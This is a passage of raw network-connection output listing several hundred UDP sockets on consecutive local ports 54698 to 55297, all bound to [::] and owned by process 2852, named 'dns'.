  UDP        [::]                                        54698         *:*                            2852              dns
  UDP        [::]                                        54699         *:*                            2852              dns
  UDP        [::]                                        54700         *:*                            2852              dns
  UDP        [::]                                        54701         *:*                            2852              dns
  UDP        [::]                                        54702         *:*                            2852              dns
  UDP        [::]                                        54703         *:*                            2852              dns
  UDP        [::]                                        54704         *:*                            2852              dns
  UDP        [::]                                        54705         *:*                            2852              dns
  UDP        [::]                                        54706         *:*                            2852              dns
  UDP        [::]                                        54707         *:*                            2852              dns
  UDP        [::]                                        54708         *:*                            2852              dns
  UDP        [::]                                        54709         *:*                            2852              dns
  UDP        [::]                                        54710         *:*                            2852              dns
  UDP        [::]                                        54711         *:*                            2852              dns
  UDP        [::]                                        54712         *:*                            2852              dns
  UDP        [::]                                        54713         *:*                            2852              dns
  UDP        [::]                                        54714         *:*                            2852              dns
  UDP        [::]                                        54715         *:*                            2852              dns
  UDP        [::]                                        54716         *:*                            2852              dns
  UDP        [::]                                        54717         *:*                            2852              dns
  UDP        [::]                                        54718         *:*                            2852              dns
  UDP        [::]                                        54719         *:*                            2852              dns
  UDP        [::]                                        54720         *:*                            2852              dns
  UDP        [::]                                        54721         *:*                            2852              dns
  UDP        [::]                                        54722         *:*                            2852              dns
  UDP        [::]                                        54723         *:*                            2852              dns
  UDP        [::]                                        54724         *:*                            2852              dns
  UDP        [::]                                        54725         *:*                            2852              dns
  UDP        [::]                                        54726         *:*                            2852              dns
  UDP        [::]                                        54727         *:*                            2852              dns
  UDP        [::]                                        54728         *:*                            2852              dns
  UDP        [::]                                        54729         *:*                            2852              dns
  UDP        [::]                                        54730         *:*                            2852              dns
  UDP        [::]                                        54731         *:*                            2852              dns
  UDP        [::]                                        54732         *:*                            2852              dns
  UDP        [::]                                        54733         *:*                            2852              dns
  UDP        [::]                                        54734         *:*                            2852              dns
  UDP        [::]                                        54735         *:*                            2852              dns
  UDP        [::]                                        54736         *:*                            2852              dns
  UDP        [::]                                        54737         *:*                            2852              dns
  UDP        [::]                                        54738         *:*                            2852              dns
  UDP        [::]                                        54739         *:*                            2852              dns
  UDP        [::]                                        54740         *:*                            2852              dns
  UDP        [::]                                        54741         *:*                            2852              dns
  UDP        [::]                                        54742         *:*                            2852              dns
  UDP        [::]                                        54743         *:*                            2852              dns
  UDP        [::]                                        54744         *:*                            2852              dns
  UDP        [::]                                        54745         *:*                            2852              dns
  UDP        [::]                                        54746         *:*                            2852              dns
  UDP        [::]                                        54747         *:*                            2852              dns
  UDP        [::]                                        54748         *:*                            2852              dns
  UDP        [::]                                        54749         *:*                            2852              dns
  UDP        [::]                                        54750         *:*                            2852              dns
  UDP        [::]                                        54751         *:*                            2852              dns
  UDP        [::]                                        54752         *:*                            2852              dns
  UDP        [::]                                        54753         *:*                            2852              dns
  UDP        [::]                                        54754         *:*                            2852              dns
  UDP        [::]                                        54755         *:*                            2852              dns
  UDP        [::]                                        54756         *:*                            2852              dns
  UDP        [::]                                        54757         *:*                            2852              dns
  UDP        [::]                                        54758         *:*                            2852              dns
  UDP        [::]                                        54759         *:*                            2852              dns
  UDP        [::]                                        54760         *:*                            2852              dns
  UDP        [::]                                        54761         *:*                            2852              dns
  UDP        [::]                                        54762         *:*                            2852              dns
  UDP        [::]                                        54763         *:*                            2852              dns
  UDP        [::]                                        54764         *:*                            2852              dns
  UDP        [::]                                        54765         *:*                            2852              dns
  UDP        [::]                                        54766         *:*                            2852              dns
  UDP        [::]                                        54767         *:*                            2852              dns
  UDP        [::]                                        54768         *:*                            2852              dns
  UDP        [::]                                        54769         *:*                            2852              dns
  UDP        [::]                                        54770         *:*                            2852              dns
  UDP        [::]                                        54771         *:*                            2852              dns
  UDP        [::]                                        54772         *:*                            2852              dns
  UDP        [::]                                        54773         *:*                            2852              dns
  UDP        [::]                                        54774         *:*                            2852              dns
  UDP        [::]                                        54775         *:*                            2852              dns
  UDP        [::]                                        54776         *:*                            2852              dns
  UDP        [::]                                        54777         *:*                            2852              dns
  UDP        [::]                                        54778         *:*                            2852              dns
  UDP        [::]                                        54779         *:*                            2852              dns
  UDP        [::]                                        54780         *:*                            2852              dns
  UDP        [::]                                        54781         *:*                            2852              dns
  UDP        [::]                                        54782         *:*                            2852              dns
  UDP        [::]                                        54783         *:*                            2852              dns
  UDP        [::]                                        54784         *:*                            2852              dns
  UDP        [::]                                        54785         *:*                            2852              dns
  UDP        [::]                                        54786         *:*                            2852              dns
  UDP        [::]                                        54787         *:*                            2852              dns
  UDP        [::]                                        54788         *:*                            2852              dns
  UDP        [::]                                        54789         *:*                            2852              dns
  UDP        [::]                                        54790         *:*                            2852              dns
  UDP        [::]                                        54791         *:*                            2852              dns
  UDP        [::]                                        54792         *:*                            2852              dns
  UDP        [::]                                        54793         *:*                            2852              dns
  UDP        [::]                                        54794         *:*                            2852              dns
  UDP        [::]                                        54795         *:*                            2852              dns
  UDP        [::]                                        54796         *:*                            2852              dns
  UDP        [::]                                        54797         *:*                            2852              dns
  UDP        [::]                                        54798         *:*                            2852              dns
  UDP        [::]                                        54799         *:*                            2852              dns
  UDP        [::]                                        54800         *:*                            2852              dns
  UDP        [::]                                        54801         *:*                            2852              dns
  UDP        [::]                                        54802         *:*                            2852              dns
  UDP        [::]                                        54803         *:*                            2852              dns
  UDP        [::]                                        54804         *:*                            2852              dns
  UDP        [::]                                        54805         *:*                            2852              dns
  UDP        [::]                                        54806         *:*                            2852              dns
  UDP        [::]                                        54807         *:*                            2852              dns
  UDP        [::]                                        54808         *:*                            2852              dns
  UDP        [::]                                        54809         *:*                            2852              dns
  UDP        [::]                                        54810         *:*                            2852              dns
  UDP        [::]                                        54811         *:*                            2852              dns
  UDP        [::]                                        54812         *:*                            2852              dns
  UDP        [::]                                        54813         *:*                            2852              dns
  UDP        [::]                                        54814         *:*                            2852              dns
  UDP        [::]                                        54815         *:*                            2852              dns
  UDP        [::]                                        54816         *:*                            2852              dns
  UDP        [::]                                        54817         *:*                            2852              dns
  UDP        [::]                                        54818         *:*                            2852              dns
  UDP        [::]                                        54819         *:*                            2852              dns
  UDP        [::]                                        54820         *:*                            2852              dns
  UDP        [::]                                        54821         *:*                            2852              dns
  UDP        [::]                                        54822         *:*                            2852              dns
  UDP        [::]                                        54823         *:*                            2852              dns
  UDP        [::]                                        54824         *:*                            2852              dns
  UDP        [::]                                        54825         *:*                            2852              dns
  UDP        [::]                                        54826         *:*                            2852              dns
  UDP        [::]                                        54827         *:*                            2852              dns
  UDP        [::]                                        54828         *:*                            2852              dns
  UDP        [::]                                        54829         *:*                            2852              dns
  UDP        [::]                                        54830         *:*                            2852              dns
  UDP        [::]                                        54831         *:*                            2852              dns
  UDP        [::]                                        54832         *:*                            2852              dns
  UDP        [::]                                        54833         *:*                            2852              dns
  UDP        [::]                                        54834         *:*                            2852              dns
  UDP        [::]                                        54835         *:*                            2852              dns
  UDP        [::]                                        54836         *:*                            2852              dns
  UDP        [::]                                        54837         *:*                            2852              dns
  UDP        [::]                                        54838         *:*                            2852              dns
  UDP        [::]                                        54839         *:*                            2852              dns
  UDP        [::]                                        54840         *:*                            2852              dns
  UDP        [::]                                        54841         *:*                            2852              dns
  UDP        [::]                                        54842         *:*                            2852              dns
  UDP        [::]                                        54843         *:*                            2852              dns
  UDP        [::]                                        54844         *:*                            2852              dns
  UDP        [::]                                        54845         *:*                            2852              dns
  UDP        [::]                                        54846         *:*                            2852              dns
  UDP        [::]                                        54847         *:*                            2852              dns
  UDP        [::]                                        54848         *:*                            2852              dns
  UDP        [::]                                        54849         *:*                            2852              dns
  UDP        [::]                                        54850         *:*                            2852              dns
  UDP        [::]                                        54851         *:*                            2852              dns
  UDP        [::]                                        54852         *:*                            2852              dns
  UDP        [::]                                        54853         *:*                            2852              dns
  UDP        [::]                                        54854         *:*                            2852              dns
  UDP        [::]                                        54855         *:*                            2852              dns
  UDP        [::]                                        54856         *:*                            2852              dns
  UDP        [::]                                        54857         *:*                            2852              dns
  UDP        [::]                                        54858         *:*                            2852              dns
  UDP        [::]                                        54859         *:*                            2852              dns
  UDP        [::]                                        54860         *:*                            2852              dns
  UDP        [::]                                        54861         *:*                            2852              dns
  UDP        [::]                                        54862         *:*                            2852              dns
  UDP        [::]                                        54863         *:*                            2852              dns
  UDP        [::]                                        54864         *:*                            2852              dns
  UDP        [::]                                        54865         *:*                            2852              dns
  UDP        [::]                                        54866         *:*                            2852              dns
  UDP        [::]                                        54867         *:*                            2852              dns
  UDP        [::]                                        54868         *:*                            2852              dns
  UDP        [::]                                        54869         *:*                            2852              dns
  UDP        [::]                                        54870         *:*                            2852              dns
  UDP        [::]                                        54871         *:*                            2852              dns
  UDP        [::]                                        54872         *:*                            2852              dns
  UDP        [::]                                        54873         *:*                            2852              dns
  UDP        [::]                                        54874         *:*                            2852              dns
  UDP        [::]                                        54875         *:*                            2852              dns
  UDP        [::]                                        54876         *:*                            2852              dns
  UDP        [::]                                        54877         *:*                            2852              dns
  UDP        [::]                                        54878         *:*                            2852              dns
  UDP        [::]                                        54879         *:*                            2852              dns
  UDP        [::]                                        54880         *:*                            2852              dns
  UDP        [::]                                        54881         *:*                            2852              dns
  UDP        [::]                                        54882         *:*                            2852              dns
  UDP        [::]                                        54883         *:*                            2852              dns
  UDP        [::]                                        54884         *:*                            2852              dns
  UDP        [::]                                        54885         *:*                            2852              dns
  UDP        [::]                                        54886         *:*                            2852              dns
  UDP        [::]                                        54887         *:*                            2852              dns
  UDP        [::]                                        54888         *:*                            2852              dns
  UDP        [::]                                        54889         *:*                            2852              dns
  UDP        [::]                                        54890         *:*                            2852              dns
  UDP        [::]                                        54891         *:*                            2852              dns
  UDP        [::]                                        54892         *:*                            2852              dns
  UDP        [::]                                        54893         *:*                            2852              dns
  UDP        [::]                                        54894         *:*                            2852              dns
  UDP        [::]                                        54895         *:*                            2852              dns
  UDP        [::]                                        54896         *:*                            2852              dns
  UDP        [::]                                        54897         *:*                            2852              dns
  UDP        [::]                                        54898         *:*                            2852              dns
  UDP        [::]                                        54899         *:*                            2852              dns
  UDP        [::]                                        54900         *:*                            2852              dns
  UDP        [::]                                        54901         *:*                            2852              dns
  UDP        [::]                                        54902         *:*                            2852              dns
  UDP        [::]                                        54903         *:*                            2852              dns
  UDP        [::]                                        54904         *:*                            2852              dns
  UDP        [::]                                        54905         *:*                            2852              dns
  UDP        [::]                                        54906         *:*                            2852              dns
  UDP        [::]                                        54907         *:*                            2852              dns
  UDP        [::]                                        54908         *:*                            2852              dns
  UDP        [::]                                        54909         *:*                            2852              dns
  UDP        [::]                                        54910         *:*                            2852              dns
  UDP        [::]                                        54911         *:*                            2852              dns
  UDP        [::]                                        54912         *:*                            2852              dns
  UDP        [::]                                        54913         *:*                            2852              dns
  UDP        [::]                                        54914         *:*                            2852              dns
  UDP        [::]                                        54915         *:*                            2852              dns
  UDP        [::]                                        54916         *:*                            2852              dns
  UDP        [::]                                        54917         *:*                            2852              dns
  UDP        [::]                                        54918         *:*                            2852              dns
  UDP        [::]                                        54919         *:*                            2852              dns
  UDP        [::]                                        54920         *:*                            2852              dns
  UDP        [::]                                        54921         *:*                            2852              dns
  UDP        [::]                                        54922         *:*                            2852              dns
  UDP        [::]                                        54923         *:*                            2852              dns
  UDP        [::]                                        54924         *:*                            2852              dns
  UDP        [::]                                        54925         *:*                            2852              dns
  UDP        [::]                                        54926         *:*                            2852              dns
  UDP        [::]                                        54927         *:*                            2852              dns
  UDP        [::]                                        54928         *:*                            2852              dns
  UDP        [::]                                        54929         *:*                            2852              dns
  UDP        [::]                                        54930         *:*                            2852              dns
  UDP        [::]                                        54931         *:*                            2852              dns
  UDP        [::]                                        54932         *:*                            2852              dns
  UDP        [::]                                        54933         *:*                            2852              dns
  UDP        [::]                                        54934         *:*                            2852              dns
  UDP        [::]                                        54935         *:*                            2852              dns
  UDP        [::]                                        54936         *:*                            2852              dns
  UDP        [::]                                        54937         *:*                            2852              dns
  UDP        [::]                                        54938         *:*                            2852              dns
  UDP        [::]                                        54939         *:*                            2852              dns
  UDP        [::]                                        54940         *:*                            2852              dns
  UDP        [::]                                        54941         *:*                            2852              dns
  UDP        [::]                                        54942         *:*                            2852              dns
  UDP        [::]                                        54943         *:*                            2852              dns
  UDP        [::]                                        54944         *:*                            2852              dns
  UDP        [::]                                        54945         *:*                            2852              dns
  UDP        [::]                                        54946         *:*                            2852              dns
  UDP        [::]                                        54947         *:*                            2852              dns
  UDP        [::]                                        54948         *:*                            2852              dns
  UDP        [::]                                        54949         *:*                            2852              dns
  UDP        [::]                                        54950         *:*                            2852              dns
  UDP        [::]                                        54951         *:*                            2852              dns
  UDP        [::]                                        54952         *:*                            2852              dns
  UDP        [::]                                        54953         *:*                            2852              dns
  UDP        [::]                                        54954         *:*                            2852              dns
  UDP        [::]                                        54955         *:*                            2852              dns
  UDP        [::]                                        54956         *:*                            2852              dns
  UDP        [::]                                        54957         *:*                            2852              dns
  UDP        [::]                                        54958         *:*                            2852              dns
  UDP        [::]                                        54959         *:*                            2852              dns
  UDP        [::]                                        54960         *:*                            2852              dns
  UDP        [::]                                        54961         *:*                            2852              dns
  UDP        [::]                                        54962         *:*                            2852              dns
  UDP        [::]                                        54963         *:*                            2852              dns
  UDP        [::]                                        54964         *:*                            2852              dns
  UDP        [::]                                        54965         *:*                            2852              dns
  UDP        [::]                                        54966         *:*                            2852              dns
  UDP        [::]                                        54967         *:*                            2852              dns
  UDP        [::]                                        54968         *:*                            2852              dns
  UDP        [::]                                        54969         *:*                            2852              dns
  UDP        [::]                                        54970         *:*                            2852              dns
  UDP        [::]                                        54971         *:*                            2852              dns
  UDP        [::]                                        54972         *:*                            2852              dns
  UDP        [::]                                        54973         *:*                            2852              dns
  UDP        [::]                                        54974         *:*                            2852              dns
  UDP        [::]                                        54975         *:*                            2852              dns
  UDP        [::]                                        54976         *:*                            2852              dns
  UDP        [::]                                        54977         *:*                            2852              dns
  UDP        [::]                                        54978         *:*                            2852              dns
  UDP        [::]                                        54979         *:*                            2852              dns
  UDP        [::]                                        54980         *:*                            2852              dns
  UDP        [::]                                        54981         *:*                            2852              dns
  UDP        [::]                                        54982         *:*                            2852              dns
  UDP        [::]                                        54983         *:*                            2852              dns
  UDP        [::]                                        54984         *:*                            2852              dns
  UDP        [::]                                        54985         *:*                            2852              dns
  UDP        [::]                                        54986         *:*                            2852              dns
  UDP        [::]                                        54987         *:*                            2852              dns
  UDP        [::]                                        54988         *:*                            2852              dns
  UDP        [::]                                        54989         *:*                            2852              dns
  UDP        [::]                                        54990         *:*                            2852              dns
  UDP        [::]                                        54991         *:*                            2852              dns
  UDP        [::]                                        54992         *:*                            2852              dns
  UDP        [::]                                        54993         *:*                            2852              dns
  UDP        [::]                                        54994         *:*                            2852              dns
  UDP        [::]                                        54995         *:*                            2852              dns
  UDP        [::]                                        54996         *:*                            2852              dns
  UDP        [::]                                        54997         *:*                            2852              dns
  UDP        [::]                                        54998         *:*                            2852              dns
  UDP        [::]                                        54999         *:*                            2852              dns
  UDP        [::]                                        55000         *:*                            2852              dns
  UDP        [::]                                        55001         *:*                            2852              dns
  UDP        [::]                                        55002         *:*                            2852              dns
  UDP        [::]                                        55003         *:*                            2852              dns
  UDP        [::]                                        55004         *:*                            2852              dns
  UDP        [::]                                        55005         *:*                            2852              dns
  UDP        [::]                                        55006         *:*                            2852              dns
  UDP        [::]                                        55007         *:*                            2852              dns
  UDP        [::]                                        55008         *:*                            2852              dns
  UDP        [::]                                        55009         *:*                            2852              dns
  UDP        [::]                                        55010         *:*                            2852              dns
  UDP        [::]                                        55011         *:*                            2852              dns
  UDP        [::]                                        55012         *:*                            2852              dns
  UDP        [::]                                        55013         *:*                            2852              dns
  UDP        [::]                                        55014         *:*                            2852              dns
  UDP        [::]                                        55015         *:*                            2852              dns
  UDP        [::]                                        55016         *:*                            2852              dns
  UDP        [::]                                        55017         *:*                            2852              dns
  UDP        [::]                                        55018         *:*                            2852              dns
  UDP        [::]                                        55019         *:*                            2852              dns
  UDP        [::]                                        55020         *:*                            2852              dns
  UDP        [::]                                        55021         *:*                            2852              dns
  UDP        [::]                                        55022         *:*                            2852              dns
  UDP        [::]                                        55023         *:*                            2852              dns
  UDP        [::]                                        55024         *:*                            2852              dns
  UDP        [::]                                        55025         *:*                            2852              dns
  UDP        [::]                                        55026         *:*                            2852              dns
  UDP        [::]                                        55027         *:*                            2852              dns
  UDP        [::]                                        55028         *:*                            2852              dns
  UDP        [::]                                        55029         *:*                            2852              dns
  UDP        [::]                                        55030         *:*                            2852              dns
  UDP        [::]                                        55031         *:*                            2852              dns
  UDP        [::]                                        55032         *:*                            2852              dns
  UDP        [::]                                        55033         *:*                            2852              dns
  UDP        [::]                                        55034         *:*                            2852              dns
  UDP        [::]                                        55035         *:*                            2852              dns
  UDP        [::]                                        55036         *:*                            2852              dns
  UDP        [::]                                        55037         *:*                            2852              dns
  UDP        [::]                                        55038         *:*                            2852              dns
  UDP        [::]                                        55039         *:*                            2852              dns
  UDP        [::]                                        55040         *:*                            2852              dns
  UDP        [::]                                        55041         *:*                            2852              dns
  UDP        [::]                                        55042         *:*                            2852              dns
  UDP        [::]                                        55043         *:*                            2852              dns
  UDP        [::]                                        55044         *:*                            2852              dns
  UDP        [::]                                        55045         *:*                            2852              dns
  UDP        [::]                                        55046         *:*                            2852              dns
  UDP        [::]                                        55047         *:*                            2852              dns
  UDP        [::]                                        55048         *:*                            2852              dns
  UDP        [::]                                        55049         *:*                            2852              dns
  UDP        [::]                                        55050         *:*                            2852              dns
  UDP        [::]                                        55051         *:*                            2852              dns
  UDP        [::]                                        55052         *:*                            2852              dns
  UDP        [::]                                        55053         *:*                            2852              dns
  UDP        [::]                                        55054         *:*                            2852              dns
  UDP        [::]                                        55055         *:*                            2852              dns
  UDP        [::]                                        55056         *:*                            2852              dns
  UDP        [::]                                        55057         *:*                            2852              dns
  UDP        [::]                                        55058         *:*                            2852              dns
  UDP        [::]                                        55059         *:*                            2852              dns
  UDP        [::]                                        55060         *:*                            2852              dns
  UDP        [::]                                        55061         *:*                            2852              dns
  UDP        [::]                                        55062         *:*                            2852              dns
  UDP        [::]                                        55063         *:*                            2852              dns
  UDP        [::]                                        55064         *:*                            2852              dns
  UDP        [::]                                        55065         *:*                            2852              dns
  UDP        [::]                                        55066         *:*                            2852              dns
  UDP        [::]                                        55067         *:*                            2852              dns
  UDP        [::]                                        55068         *:*                            2852              dns
  UDP        [::]                                        55069         *:*                            2852              dns
  UDP        [::]                                        55070         *:*                            2852              dns
  UDP        [::]                                        55071         *:*                            2852              dns
  UDP        [::]                                        55072         *:*                            2852              dns
  UDP        [::]                                        55073         *:*                            2852              dns
  UDP        [::]                                        55074         *:*                            2852              dns
  UDP        [::]                                        55075         *:*                            2852              dns
  UDP        [::]                                        55076         *:*                            2852              dns
  UDP        [::]                                        55077         *:*                            2852              dns
  UDP        [::]                                        55078         *:*                            2852              dns
  UDP        [::]                                        55079         *:*                            2852              dns
  UDP        [::]                                        55080         *:*                            2852              dns
  UDP        [::]                                        55081         *:*                            2852              dns
  UDP        [::]                                        55082         *:*                            2852              dns
  UDP        [::]                                        55083         *:*                            2852              dns
  UDP        [::]                                        55084         *:*                            2852              dns
  UDP        [::]                                        55085         *:*                            2852              dns
  UDP        [::]                                        55086         *:*                            2852              dns
  UDP        [::]                                        55087         *:*                            2852              dns
  UDP        [::]                                        55088         *:*                            2852              dns
  UDP        [::]                                        55089         *:*                            2852              dns
  UDP        [::]                                        55090         *:*                            2852              dns
  UDP        [::]                                        55091         *:*                            2852              dns
  UDP        [::]                                        55092         *:*                            2852              dns
  UDP        [::]                                        55093         *:*                            2852              dns
  UDP        [::]                                        55094         *:*                            2852              dns
  UDP        [::]                                        55095         *:*                            2852              dns
  UDP        [::]                                        55096         *:*                            2852              dns
  UDP        [::]                                        55097         *:*                            2852              dns
  UDP        [::]                                        55098         *:*                            2852              dns
  UDP        [::]                                        55099         *:*                            2852              dns
  UDP        [::]                                        55100         *:*                            2852              dns
  UDP        [::]                                        55101         *:*                            2852              dns
  UDP        [::]                                        55102         *:*                            2852              dns
  UDP        [::]                                        55103         *:*                            2852              dns
  UDP        [::]                                        55104         *:*                            2852              dns
  UDP        [::]                                        55105         *:*                            2852              dns
  UDP        [::]                                        55106         *:*                            2852              dns
  UDP        [::]                                        55107         *:*                            2852              dns
  UDP        [::]                                        55108         *:*                            2852              dns
  UDP        [::]                                        55109         *:*                            2852              dns
  UDP        [::]                                        55110         *:*                            2852              dns
  UDP        [::]                                        55111         *:*                            2852              dns
  UDP        [::]                                        55112         *:*                            2852              dns
  UDP        [::]                                        55113         *:*                            2852              dns
  UDP        [::]                                        55114         *:*                            2852              dns
  UDP        [::]                                        55115         *:*                            2852              dns
  UDP        [::]                                        55116         *:*                            2852              dns
  UDP        [::]                                        55117         *:*                            2852              dns
  UDP        [::]                                        55118         *:*                            2852              dns
  UDP        [::]                                        55119         *:*                            2852              dns
  UDP        [::]                                        55120         *:*                            2852              dns
  UDP        [::]                                        55121         *:*                            2852              dns
  UDP        [::]                                        55122         *:*                            2852              dns
  UDP        [::]                                        55123         *:*                            2852              dns
  UDP        [::]                                        55124         *:*                            2852              dns
  UDP        [::]                                        55125         *:*                            2852              dns
  UDP        [::]                                        55126         *:*                            2852              dns
  UDP        [::]                                        55127         *:*                            2852              dns
  UDP        [::]                                        55128         *:*                            2852              dns
  UDP        [::]                                        55129         *:*                            2852              dns
  UDP        [::]                                        55130         *:*                            2852              dns
  UDP        [::]                                        55131         *:*                            2852              dns
  UDP        [::]                                        55132         *:*                            2852              dns
  UDP        [::]                                        55133         *:*                            2852              dns
  UDP        [::]                                        55134         *:*                            2852              dns
  UDP        [::]                                        55135         *:*                            2852              dns
  UDP        [::]                                        55136         *:*                            2852              dns
  UDP        [::]                                        55137         *:*                            2852              dns
  UDP        [::]                                        55138         *:*                            2852              dns
  UDP        [::]                                        55139         *:*                            2852              dns
  UDP        [::]                                        55140         *:*                            2852              dns
  UDP        [::]                                        55141         *:*                            2852              dns
  UDP        [::]                                        55142         *:*                            2852              dns
  UDP        [::]                                        55143         *:*                            2852              dns
  UDP        [::]                                        55144         *:*                            2852              dns
  UDP        [::]                                        55145         *:*                            2852              dns
  UDP        [::]                                        55146         *:*                            2852              dns
  UDP        [::]                                        55147         *:*                            2852              dns
  UDP        [::]                                        55148         *:*                            2852              dns
  UDP        [::]                                        55149         *:*                            2852              dns
  UDP        [::]                                        55150         *:*                            2852              dns
  UDP        [::]                                        55151         *:*                            2852              dns
  UDP        [::]                                        55152         *:*                            2852              dns
  UDP        [::]                                        55153         *:*                            2852              dns
  UDP        [::]                                        55154         *:*                            2852              dns
  UDP        [::]                                        55155         *:*                            2852              dns
  UDP        [::]                                        55156         *:*                            2852              dns
  UDP        [::]                                        55157         *:*                            2852              dns
  UDP        [::]                                        55158         *:*                            2852              dns
  UDP        [::]                                        55159         *:*                            2852              dns
  UDP        [::]                                        55160         *:*                            2852              dns
  UDP        [::]                                        55161         *:*                            2852              dns
  UDP        [::]                                        55162         *:*                            2852              dns
  UDP        [::]                                        55163         *:*                            2852              dns
  UDP        [::]                                        55164         *:*                            2852              dns
  UDP        [::]                                        55165         *:*                            2852              dns
  UDP        [::]                                        55166         *:*                            2852              dns
  UDP        [::]                                        55167         *:*                            2852              dns
  UDP        [::]                                        55168         *:*                            2852              dns
  UDP        [::]                                        55169         *:*                            2852              dns
  UDP        [::]                                        55170         *:*                            2852              dns
  UDP        [::]                                        55171         *:*                            2852              dns
  UDP        [::]                                        55172         *:*                            2852              dns
  UDP        [::]                                        55173         *:*                            2852              dns
  UDP        [::]                                        55174         *:*                            2852              dns
  UDP        [::]                                        55175         *:*                            2852              dns
  UDP        [::]                                        55176         *:*                            2852              dns
  UDP        [::]                                        55177         *:*                            2852              dns
  UDP        [::]                                        55178         *:*                            2852              dns
  UDP        [::]                                        55179         *:*                            2852              dns
  UDP        [::]                                        55180         *:*                            2852              dns
  UDP        [::]                                        55181         *:*                            2852              dns
  UDP        [::]                                        55182         *:*                            2852              dns
  UDP        [::]                                        55183         *:*                            2852              dns
  UDP        [::]                                        55184         *:*                            2852              dns
  UDP        [::]                                        55185         *:*                            2852              dns
  UDP        [::]                                        55186         *:*                            2852              dns
  UDP        [::]                                        55187         *:*                            2852              dns
  UDP        [::]                                        55188         *:*                            2852              dns
  UDP        [::]                                        55189         *:*                            2852              dns
  UDP        [::]                                        55190         *:*                            2852              dns
  UDP        [::]                                        55191         *:*                            2852              dns
  UDP        [::]                                        55192         *:*                            2852              dns
  UDP        [::]                                        55193         *:*                            2852              dns
  UDP        [::]                                        55194         *:*                            2852              dns
  UDP        [::]                                        55195         *:*                            2852              dns
  UDP        [::]                                        55196         *:*                            2852              dns
  UDP        [::]                                        55197         *:*                            2852              dns
  UDP        [::]                                        55198         *:*                            2852              dns
  UDP        [::]                                        55199         *:*                            2852              dns
  UDP        [::]                                        55200         *:*                            2852              dns
  UDP        [::]                                        55201         *:*                            2852              dns
  UDP        [::]                                        55202         *:*                            2852              dns
  UDP        [::]                                        55203         *:*                            2852              dns
  UDP        [::]                                        55204         *:*                            2852              dns
  UDP        [::]                                        55205         *:*                            2852              dns
  UDP        [::]                                        55206         *:*                            2852              dns
  UDP        [::]                                        55207         *:*                            2852              dns
  UDP        [::]                                        55208         *:*                            2852              dns
  UDP        [::]                                        55209         *:*                            2852              dns
  UDP        [::]                                        55210         *:*                            2852              dns
  UDP        [::]                                        55211         *:*                            2852              dns
  UDP        [::]                                        55212         *:*                            2852              dns
  UDP        [::]                                        55213         *:*                            2852              dns
  UDP        [::]                                        55214         *:*                            2852              dns
  UDP        [::]                                        55215         *:*                            2852              dns
  UDP        [::]                                        55216         *:*                            2852              dns
  UDP        [::]                                        55217         *:*                            2852              dns
  UDP        [::]                                        55218         *:*                            2852              dns
  UDP        [::]                                        55219         *:*                            2852              dns
  UDP        [::]                                        55220         *:*                            2852              dns
  UDP        [::]                                        55221         *:*                            2852              dns
  UDP        [::]                                        55222         *:*                            2852              dns
  UDP        [::]                                        55223         *:*                            2852              dns
  UDP        [::]                                        55224         *:*                            2852              dns
  UDP        [::]                                        55225         *:*                            2852              dns
  UDP        [::]                                        55226         *:*                            2852              dns
  UDP        [::]                                        55227         *:*                            2852              dns
  UDP        [::]                                        55228         *:*                            2852              dns
  UDP        [::]                                        55229         *:*                            2852              dns
  UDP        [::]                                        55230         *:*                            2852              dns
  UDP        [::]                                        55231         *:*                            2852              dns
  UDP        [::]                                        55232         *:*                            2852              dns
  UDP        [::]                                        55233         *:*                            2852              dns
  UDP        [::]                                        55234         *:*                            2852              dns
  UDP        [::]                                        55235         *:*                            2852              dns
  UDP        [::]                                        55236         *:*                            2852              dns
  UDP        [::]                                        55237         *:*                            2852              dns
  UDP        [::]                                        55238         *:*                            2852              dns
  UDP        [::]                                        55239         *:*                            2852              dns
  UDP        [::]                                        55240         *:*                            2852              dns
  UDP        [::]                                        55241         *:*                            2852              dns
  UDP        [::]                                        55242         *:*                            2852              dns
  UDP        [::]                                        55243         *:*                            2852              dns
  UDP        [::]                                        55244         *:*                            2852              dns
  UDP        [::]                                        55245         *:*                            2852              dns
  UDP        [::]                                        55246         *:*                            2852              dns
  UDP        [::]                                        55247         *:*                            2852              dns
  UDP        [::]                                        55248         *:*                            2852              dns
  UDP        [::]                                        55249         *:*                            2852              dns
  UDP        [::]                                        55250         *:*                            2852              dns
  UDP        [::]                                        55251         *:*                            2852              dns
  UDP        [::]                                        55252         *:*                            2852              dns
  UDP        [::]                                        55253         *:*                            2852              dns
  UDP        [::]                                        55254         *:*                            2852              dns
  UDP        [::]                                        55255         *:*                            2852              dns
  UDP        [::]                                        55256         *:*                            2852              dns
  UDP        [::]                                        55257         *:*                            2852              dns
  UDP        [::]                                        55258         *:*                            2852              dns
  UDP        [::]                                        55259         *:*                            2852              dns
  UDP        [::]                                        55260         *:*                            2852              dns
  UDP        [::]                                        55261         *:*                            2852              dns
  UDP        [::]                                        55262         *:*                            2852              dns
  UDP        [::]                                        55263         *:*                            2852              dns
  UDP        [::]                                        55264         *:*                            2852              dns
  UDP        [::]                                        55265         *:*                            2852              dns
  UDP        [::]                                        55266         *:*                            2852              dns
  UDP        [::]                                        55267         *:*                            2852              dns
  UDP        [::]                                        55268         *:*                            2852              dns
  UDP        [::]                                        55269         *:*                            2852              dns
  UDP        [::]                                        55270         *:*                            2852              dns
  UDP        [::]                                        55271         *:*                            2852              dns
  UDP        [::]                                        55272         *:*                            2852              dns
  UDP        [::]                                        55273         *:*                            2852              dns
  UDP        [::]                                        55274         *:*                            2852              dns
  UDP        [::]                                        55275         *:*                            2852              dns
  UDP        [::]                                        55276         *:*                            2852              dns
  UDP        [::]                                        55277         *:*                            2852              dns
  UDP        [::]                                        55278         *:*                            2852              dns
  UDP        [::]                                        55279         *:*                            2852              dns
  UDP        [::]                                        55280         *:*                            2852              dns
  UDP        [::]                                        55281         *:*                            2852              dns
  UDP        [::]                                        55282         *:*                            2852              dns
  UDP        [::]                                        55283         *:*                            2852              dns
  UDP        [::]                                        55284         *:*                            2852              dns
  UDP        [::]                                        55285         *:*                            2852              dns
  UDP        [::]                                        55286         *:*                            2852              dns
  UDP        [::]                                        55287         *:*                            2852              dns
  UDP        [::]                                        55288         *:*                            2852              dns
  UDP        [::]                                        55289         *:*                            2852              dns
  UDP        [::]                                        55290         *:*                            2852              dns
  UDP        [::]                                        55291         *:*                            2852              dns
  UDP        [::]                                        55292         *:*                            2852              dns
  UDP        [::]                                        55293         *:*                            2852              dns
  UDP        [::]                                        55294         *:*                            2852              dns
  UDP        [::]                                        55295         *:*                            2852              dns
  UDP        [::]                                        55296         *:*                            2852              dns
  UDP        [::]                                        55297         *:*                            2852              dns
